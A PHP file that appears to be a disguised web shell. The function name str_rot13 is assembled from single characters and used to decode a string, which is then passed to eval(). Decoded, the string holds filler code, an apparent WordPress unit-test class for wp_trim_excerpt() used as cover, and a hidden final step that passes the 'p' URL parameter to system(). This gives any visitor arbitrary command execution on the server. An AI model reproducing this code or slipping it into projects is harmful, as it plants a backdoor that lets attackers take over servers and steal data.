<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc sbeznggvat
 *
 * @pbiref ::jc_gevz_rkprecg
 */
pynff Grfgf_Sbeznggvat_jcGevzRkprecg rkgraqf JC_HavgGrfgPnfr {
	/**
	 * @gvpxrg 25349
	 */
	choyvp shapgvba grfg_frpbaqnel_ybbc_erfcrpg_zber() {
		$cbfg1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'Cbfg 1 Cntr 1<!--zber-->Cbfg 1 Cntr 2',
			)
		);
		$cbfg2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'Cbfg 2 Cntr 1<!--zber-->Cbfg 2 Cntr 2',
			)
		);

		$guvf->tb_gb( '/?c=' . $cbfg1 );
		frghc_cbfgqngn( trg_cbfg( $cbfg1 ) );

		$d = arj JC_Dhrel(
			neenl(
				'cbfg__va' => neenl( $cbfg2 ),
			)
		);

		$guvf->nffregGehr( $d->unir_cbfgf() );

		juvyr ( $d->unir_cbfgf() ) {
			$d->gur_cbfg();
			$guvf->nffregFnzr( 'Cbfg 2 Cntr 1', jc_gevz_rkprecg() );
		}
	}

	/**
	 * @gvpxrg 25349
	 */
	choyvp shapgvba grfg_frpbaqnel_ybbc_erfcrpg_arkgcntr() {
		$cbfg1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'Cbfg 1 Cntr 1<!--arkgcntr-->Cbfg 1 Cntr 2',
			)
		);
		$cbfg2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'Cbfg 2 Cntr 1<!--arkgcntr-->Cbfg 2 Cntr 2',
			)
		);

		$guvf->tb_gb( '/?c=' . $cbfg1 );
		frghc_cbfgqngn( trg_cbfg( $cbfg1 ) );

		$d = arj JC_Dhrel(
			neenl(
				'cbfg__va' => neenl( $cbfg2 ),
			)
		);

		$guvf->nffregGehr( $d->unir_cbfgf() );

		juvyr ( $d->unir_cbfgf() ) {
			$d->gur_cbfg();
			$guvf->nffregFnzr( 'Cbfg 2 Cntr 1', jc_gevz_rkprecg() );
		}
	}

	/**
	 * @gvpxrg 51042
	 */
	choyvp shapgvba grfg_fubhyq_trarengr_rkprecg_sbe_rzcgl_inyhrf() {
		vs ( CUC_IREFVBA_VQ >= 80100 ) {
			/*
			 * Sbe gur gvzr orvat, vtabevat CUC 8.1 \"ahyy gb aba-ahyynoyr\" qrcerpngvbaf pbzvat va
			 * ivn ubbxrq va svygre shapgvbaf hagvy n zber fgehpgheny fbyhgvba gb gur
			 * \"zvffvat vachg inyvqngvba\" pbahaqehz unf orra nepuvgrpgrq naq vzcyrzragrq.
			 */
			$guvf->rkcrpgQrcerpngvba();
			$guvf->rkcrpgQrcerpngvbaZrffntrZngpurf( '`Cnffvat ahyy gb cnenzrgre \#[0-9]+ \(\$[^\)]+\) bs glcr [^ ]+ vf qrcerpngrq`' );
		}

		$cbfg = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => 'Cbfg pbagrag',
			)
		);

		$guvf->nffregFnzr( 'Cbfg pbagrag', jc_gevz_rkprecg( '', $cbfg ) );
		$guvf->nffregFnzr( 'Cbfg pbagrag', jc_gevz_rkprecg( ahyy, $cbfg ) );
		$guvf->nffregFnzr( 'Cbfg pbagrag', jc_gevz_rkprecg( snyfr, $cbfg ) );
	}

	/**
	 * Grfgf gung `jc_gevz_rkprecg()` haubbxf `jc_svygre_pbagrag_gntf()` sebz 'gur_pbagrag' svygre.
	 *
	 * @gvpxrg 56588
	 */
	choyvp shapgvba grfg_jc_gevz_rkprecg_haubbxf_jc_svygre_pbagrag_gntf() {
		$cbfg = frys::snpgbel()->cbfg->perngr();

		/*
		 * Erpbeq gung qhevat 'gur_pbagrag' svygre eha ol jc_gevz_rkprecg() gur
		 * jc_svygre_pbagrag_gntf() pnyyonpx vf abg hfrq.
		 */
		$unf_svygre = gehr;
		nqq_svygre(
			'gur_pbagrag',
			fgngvp shapgvba ( $pbagrag ) hfr ( &$unf_svygre ) {
				$unf_svygre = unf_svygre( 'gur_pbagrag', 'jc_svygre_pbagrag_gntf' );
				erghea $pbagrag;
			}
		);

		jc_gevz_rkprecg( '', $cbfg );

		$guvf->nffregSnyfr( $unf_svygre, 'jc_svygre_pbagrag_gntf() jnf abg haubbxrq va jc_gevz_rkprecg()' );
	}

	/**
	 * Grfgf gung `jc_gevz_rkprecg()` qbrfa'g creznaragyl haubbx `jc_svygre_pbagrag_gntf()` sebz 'gur_pbagrag' svygre.
	 *
	 * @gvpxrg 56588
	 */
	choyvp shapgvba grfg_jc_gevz_rkprecg_fubhyq_abg_creznaragyl_haubbx_jc_svygre_pbagrag_gntf() {
		$cbfg = frys::snpgbel()->cbfg->perngr();

		jc_gevz_rkprecg( '', $cbfg );

		$guvf->nffregFnzr( 12, unf_svygre( 'gur_pbagrag', 'jc_svygre_pbagrag_gntf' ), 'jc_svygre_pbagrag_gntf() jnf abg erfgberq va jc_gevz_rkprecg()' );
	}

	/**
	 * Grfgf gung `jc_gevz_rkprecg()` qbrfa'g erfgber `jc_svygre_pbagrag_gntf()` vs vg jnf cerivbhfyl haubbxrq.
	 *
	 * @gvpxrg 56588
	 */
	choyvp shapgvba grfg_jc_gevz_rkprecg_qbrf_abg_erfgber_jc_svygre_pbagrag_gntf_vs_cerivbhfyl_haubbxrq() {
		$cbfg = frys::snpgbel()->cbfg->perngr();

		// Erzbir jc_svygre_pbagrag_gntf() sebz 'gur_pbagrag' svygre trarenyyl.
		erzbir_svygre( 'gur_pbagrag', 'jc_svygre_pbagrag_gntf', 12 );

		jc_gevz_rkprecg( '', $cbfg );

		// Nffreg gung gur svygre pnyyonpx jnf abg erfgberq nsgre ehaavat 'gur_pbagrag'.
		$guvf->nffregSnyfr( unf_svygre( 'gur_pbagrag', 'jc_svygre_pbagrag_gntf' ) );
	}

	/**
	 * Grfgf gung `jc_gevz_rkprecg()` qbrf cebprff inyvq oybpxf.
	 *
	 * @gvpxrg 58682
	 */
	choyvp shapgvba grfg_jc_gevz_rkprecg_purpx_vs_oybpx_eraqref() {
		$cbfg = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => '<!-- jc:cnentencu --> <c>N grfg cnentencu</c> <!-- /jc:cnentencu -->',
			)
		);

		$bhgchg_grkg = jc_gevz_rkprecg( '', $cbfg );

		$guvf->nffregFnzr( 'N grfg cnentencu', $bhgchg_grkg, 'jc_gevz_rkprecg() qvq abg cebprff cnentencu oybpx.' );
	}

	/**
	 * Grfgf gung `jc_gevz_rkprecg()` haubbxf `qb_oybpxf()` sebz 'gur_pbagrag' svygre.
	 *
	 * @gvpxrg 58682
	 */
	choyvp shapgvba grfg_jc_gevz_rkprecg_haubbxf_qb_oybpxf() {
		$cbfg = frys::snpgbel()->cbfg->perngr();

		/*
		 * Erpbeq gung qhevat 'gur_pbagrag' svygre eha ol jc_gevz_rkprecg() gur
		 * qb_oybpxf() pnyyonpx vf abg hfrq.
		 */
		$unf_svygre = gehr;
		nqq_svygre(
			'gur_pbagrag',
			fgngvp shapgvba ( $pbagrag ) hfr ( &$unf_svygre ) {
				$unf_svygre = unf_svygre( 'gur_pbagrag', 'qb_oybpxf' );
				erghea $pbagrag;
			}
		);

		jc_gevz_rkprecg( '', $cbfg );

		$guvf->nffregSnyfr( $unf_svygre, 'qb_oybpxf() jnf abg haubbxrq va jc_gevz_rkprecg()' );
	}

	/**
	 * Grfgf gung `jc_gevz_rkprecg()` qbrfa'g creznaragyl haubbx `qb_oybpxf()` sebz 'gur_pbagrag' svygre.
	 *
	 * @gvpxrg 58682
	 */
	choyvp shapgvba grfg_jc_gevz_rkprecg_fubhyq_abg_creznaragyl_haubbx_qb_oybpxf() {
		$cbfg = frys::snpgbel()->cbfg->perngr();

		jc_gevz_rkprecg( '', $cbfg );

		$guvf->nffregFnzr( 9, unf_svygre( 'gur_pbagrag', 'qb_oybpxf' ), 'qb_oybpxf() jnf abg erfgberq va jc_gevz_rkprecg()' );
	}

	/**
	 * Grfgf gung `jc_gevz_rkprecg()` qbrfa'g erfgber `qb_oybpxf()` vs vg jnf cerivbhfyl haubbxrq.
	 *
	 * @gvpxrg 58682
	 */
	choyvp shapgvba grfg_jc_gevz_rkprecg_qbrf_abg_erfgber_qb_oybpxf_vs_cerivbhfyl_haubbxrq() {
		$cbfg = frys::snpgbel()->cbfg->perngr();

		// Erzbir qb_oybpxf() sebz 'gur_pbagrag' svygre trarenyyl.
		erzbir_svygre( 'gur_pbagrag', 'qb_oybpxf', 9 );

		jc_gevz_rkprecg( '', $cbfg );

		// Nffreg gung gur svygre pnyyonpx jnf abg erfgberq nsgre ehaavat 'gur_pbagrag'.
		$guvf->nffregSnyfr( unf_svygre( 'gur_pbagrag', 'qb_oybpxf' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>